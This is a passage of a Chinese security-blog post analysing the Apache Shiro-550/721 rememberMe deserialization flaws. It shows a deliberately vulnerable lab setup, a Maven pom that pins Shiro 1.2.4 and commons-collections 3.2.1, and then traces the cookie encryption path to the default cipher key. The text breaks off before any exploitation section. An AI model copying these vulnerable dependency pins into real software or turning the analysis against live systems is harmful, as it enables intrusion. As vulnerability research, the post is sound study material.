<!DOCTYPE html>
<html lang="en-us" class="light">

<head>
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.118.2">

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="generator" content="Saber v0.11.2">
    <meta name="author" content="F0rmat" />
    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
    <link rel="canonical" href="https://xxe.icu/shiro_deserialization_vulnerability.html" /><meta property="og:type" content="article" />
    <meta property="title" content="Shiro反序列化漏洞原理分析（Shiro-550/Shiro-721） - F0rmat&#39;s Blog">
    <meta property="og:title" content="Shiro反序列化漏洞原理分析（Shiro-550/Shiro-721） - F0rmat&#39;s Blog">
    <meta property="twitter:title" content="Shiro反序列化漏洞原理分析（Shiro-550/Shiro-721） - F0rmat&#39;s Blog">
    <meta name="description" content="0x00 前言 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。 使用Shiro的易于理解的API,您可以快速、轻松">
    <meta property="og:description" content="0x00 前言 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。 使用Shiro的易于理解的API,您可以快速、轻松">
    <meta property="twitter:description" content="0x00 前言 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。 使用Shiro的易于理解的API,您可以快速、轻松">
    <meta property="og:type" content="article">
    <title>Shiro反序列化漏洞原理分析（Shiro-550/Shiro-721） - F0rmat&#39;s Blog</title>

    <meta property="og:url" content="https://xxe.icu/shiro_deserialization_vulnerability.html" />

    
    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
    
      
      <link rel="stylesheet" href="/css/main.min.b54ec2054930af35e6f9ede7e42673f1fe6d7ebf77b68305e9d6671b4b709b2d.css" integrity="sha256-tU7CBUkwrzXm+e3n5CZz8f5tfr93toMF6dZnG0twmy0="/>
    
    
  <link rel="stylesheet" href="/css/syntax.css"/>

    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
    
    
</head>

<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">

    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">

  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>

  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
      <div class="pl-4">
          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
              F0rmat&#39;s Blog
          </a>
      </div>

      <div class="block lg:hidden pr-4">
          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
          </button>
      </div>

      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
          <ul class="list-none lg:flex justify-end flex-1 items-center">
                    <li class="mr-3">
                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
                    </li>
                    <li class="mr-3">
                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
                    </li>
                    <li class="mr-3">
                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
                    </li>
                    <li class="mr-3">
                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
                    </li>
                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
                    <div id="dark-icon" class="hidden">
                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
                    </div>
                    <div id="light-icon">
                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
                    </div> 
                </button>
          </ul>
      </div>
  </div>
</nav>

    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
<section class="w-full lg:w-3/4 xl:w-3/4">

    
    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">

        
        <div>
    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
        <a href="https://xxe.icu/shiro_deserialization_vulnerability.html" title="Shiro反序列化漏洞原理分析（Shiro-550/Shiro-721）">Shiro反序列化漏洞原理分析（Shiro-550/Shiro-721）</a>
    </h1>
    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
        <span title=" 2023-12-15 11:04:34 CST">
            <i class="iconfont icon-calendar" aria-hidden="true"></i> 15 Dec 2023
        </span>

        <span class="hidden xl:inline-block">
            |
            <i class="iconfont icon-book"></i>
            11756 字
        </span>

        <span class="hidden xl:inline-block">
            |
            <i class="iconfont icon-clock-o"></i>
            24 分钟读完
        </span>
    </p>
</div>


        <div class="md:hidden dark:text-gray-100">
            
<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
    <div class="sticky text-sm" style="top:6em;" id="menu-content">
        <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#0x00-前言">0x00 前言</a></li>
        <li><a href="#0x01-shiro-550分析">0x01 Shiro-550分析</a>
          <ul>
            <li><a href="#环境">环境</a></li>
            <li><a href="#加密过程">加密过程</a></li>
            <li><a href="#解密过程">解密过程</a></li>
            <li><a href="#漏洞利用">漏洞利用</a></li>
          </ul>
        </li>
        <li><a href="#0x02-shiro-721分析">0x02 Shiro-721分析</a>
          <ul>
            <li><a href="#环境-1">环境</a></li>
            <li><a href="#cbc加密模式分析">CBC加密模式分析</a>
              <ul>
                <li><a href="#一组加密">一组加密</a></li>
                <li><a href="#多组加密">多组加密</a></li>
              </ul>
            </li>
            <li><a href="#shiro-padding-oracle-attack">Shiro Padding Oracle Attack</a></li>
          </ul>
        </li>
        <li><a href="#0x03-无利用链的shiro反序列化利用">0x03 无利用链的Shiro反序列化利用</a></li>
        <li><a href="#0x04-总结">0x04 总结</a></li>
        <li><a href="#0x05-参考">0x05 参考</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>

        </div> 

        <div class="post-content dark:text-gray-300">
            <h2 id="0x00-前言">0x00 前言</h2>
<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p>
<p>使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
<p>我们都知道Shiro反序列化的漏洞有两个，550和721，这两个不是版本，是apache官方issue的编号。</p>
<p><a href="https://issues.apache.org/jira/projects/SHIRO/issues/SHIRO-550">https://issues.apache.org/jira/projects/SHIRO/issues/SHIRO-550</a></p>
<p><a href="https://issues.apache.org/jira/projects/SHIRO/issues/SHIRO-721">https://issues.apache.org/jira/projects/SHIRO/issues/SHIRO-721</a></p>
<h2 id="0x01-shiro-550分析">0x01 Shiro-550分析</h2>
<h3 id="环境">环境</h3>
<p>调试工具：IDEA</p>
<p>Java版本：8u65，下载地址：<a href="http://link.zhihu.com/?target=https%3A//www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>8u65源码：下载地址：<a href="http://link.zhihu.com/?target=https%3A//hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p>
<p>Shiro版本：1.2.4</p>
<p>pom文件配置：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.example<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>shirodemo<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;packaging&gt;</span>war<span class="nt">&lt;/packaging&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;name&gt;</span>shirodemo Maven Webapp<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;url&gt;</span>http://maven.apache.org<span class="nt">&lt;/url&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;properties&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;maven.compiler.source&gt;</span>1.7<span class="nt">&lt;/maven.compiler.source&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;maven.compiler.target&gt;</span>1.7<span class="nt">&lt;/maven.compiler.target&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/properties&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.shiro<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>shiro-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.apache.shiro<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>shiro-web<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.4<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>javax.servlet-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>javax.servlet.jsp<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>jsp-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>2.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>3.25.0-GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>commons-logging<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>commons-logging<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>slf4j-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.7.30<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>slf4j-simple<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.7.30<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependencies&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;build&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;finalName&gt;</span>shirodemo<span class="nt">&lt;/finalName&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;pluginManagement&gt;</span><span class="c">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;plugins&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-clean-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-resources-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.0.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.8.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-surefire-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.22.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-war-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>3.2.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-install-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.5.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;artifactId&gt;</span>maven-deploy-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;version&gt;</span>2.8.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/plugins&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/pluginManagement&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;plugins&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;configuration&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;source&gt;</span>8<span class="nt">&lt;/source&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;target&gt;</span>8<span class="nt">&lt;/target&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/configuration&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/plugins&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/build&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/project&gt;</span>
</span></span></code></pre></div><p>用的shiro是P神的环境：https://github.com/phith0n/JavaThings/tree/master/shirodemo</p>
<blockquote>
<p>1、shiro-core、shiro-web，这是shiro本身的依赖</p>
<p>2、javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这 两个依赖</p>
<p>3、slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖 commons-logging，这是shiro中用到的一个接口，不添加会爆 java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory 错误</p>
<p>4、commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖</p>
</blockquote>
<p>也可以自己新建一个maven项目：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210220347103.png" alt="image-20231210220347103"></p>
<p>如果遇到maven不会自动下载source的话可以尝试在目录下执行下面的命令即可：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mvn</span> <span class="n">dependency</span><span class="o">:</span><span class="n">sources</span> <span class="o">-</span><span class="n">DdownloadSources</span><span class="o">=</span><span class="kc">true</span> <span class="o">-</span><span class="n">DdownloadJavadocs</span><span class="o">=</span><span class="kc">true</span>
</span></span></code></pre></div><p>配置完后install：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210220607852.png" alt="image-20231210220607852"></p>
<p>配置下tomcat的服务器：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210220636951.png" alt="image-20231210220636951"></p>
<p>选择这个war：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210220712500.png" alt="image-20231210220712500"></p>
<p>如果出现了其他问题可以看下文末的参考链接。</p>
<h3 id="加密过程">加密过程</h3>
<p>我们知道shiro都是根据cookie里面的rememberMe进行利用的，那过程到底是如何呢？</p>
<p>我们尝试登陆一下看看，记得勾选remember me：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210225137761.png" alt="image-20231210225137761"></p>
<p>可以看到返回的http头里面新增了Set-Cookie，rememberMe还有一串字符。</p>
<p>可到这里我们想分析，不知何从下手，我们知道javaweb是根据web.xml进行路由判断然后进入过滤器等等的，我们在web.xml里面就写了这句：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">filter</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="n">ShiroFilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">class</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">shiro</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ShiroFilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">class</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="o">&lt;/</span><span class="n">filter</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">mapping</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="n">ShiroFilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">url</span><span class="o">-</span><span class="n">pattern</span><span class="o">&gt;/*&lt;/</span><span class="n">url</span><span class="o">-</span><span class="n">pattern</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">mapping</span><span class="o">&gt;</span>
</span></span></code></pre></div><p>意思就是说访问根目录就要走这个过滤器，那么我们跟进去看看：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210230333249.png" alt="image-20231210230333249"></p>
<p>继承于AbstractShiroFilter类，AbstractShiroFilter又继承于OncePerRequestFilter类，这里就是开始的地方，无论你是GET还是POST都会从这里开始，但是呢中间会有很多各种调用，会比较繁琐，所以不用太纠结要不要从Web程序的开头就分析，而且在文章当中这样分析会让整篇文章会得很臃肿，看起来没什么条理性，所以推荐大家理解漏洞原理即可，不必太深究：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210231057929.png" alt="image-20231210231057929"></p>
<p>这里我们就从登陆处开始分析<code>org.apache.shiro.mgt.DefaultSecurityManager</code>,因为只要登陆都会经过这里的Login方法，如果是直接用Get方式带上cookie就不走这里了，在下面的解密过程会分析到，我们在这里下个断点，然后authenticate方法验证凭证的正确性，如果不正确就不走下面的onSuccessfulLogin方法：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210232021109.png" alt="image-20231210232021109"></p>
<p>继续往下走就会走到rememberMeSuccessfulLogin方法：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210233421343.png" alt="image-20231210233421343"></p>
<p>因为怕截图太多，有一些不必要的就直接过就行了，不用走进去，往下走进onSuccessfulLogin方法。</p>
<p>进到里面不用走forgetIdentity，这里有一个判断isRememberMe的方法就是我们的有没有勾选RememberMe，如果没有就不走rememberIdentity，rememberIdentity是我们加密的关键方法：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231211003229678.png" alt="image-20231211003229678"></p>
<p>进行往下走到rememberIdentity方法，然后会进到convertPrincipalsToBytes方法：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210233707232.png" alt="image-20231210233707232"></p>
<p>这里面会序列化principals对象，也就是登陆名称root字符串。很好，已经到了关键的地方了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210233831135.png" alt="image-20231210233831135"></p>
<p>走进去，会发现一个就是我们固定key的地方了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231210234021311.png" alt="image-20231210234021311"></p>
<p>但是这个没有写值：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">encryptionCipherKey</span><span class="o">;</span>
</span></span></code></pre></div><p>但是在构造方法里面有一个方法<code>setCipherKey</code>,可以看到传入有一个常量<code>DEFAULT_CIPHER_KEY_BYTES</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">public</span> <span class="nf">AbstractRememberMeManager</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">serializer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DefaultSerializer</span><span class="o">&lt;</span><span class="n">PrincipalCollection</span><span class="o">&gt;();</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">cipherService</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AesCipherService</span><span class="o">();</span>
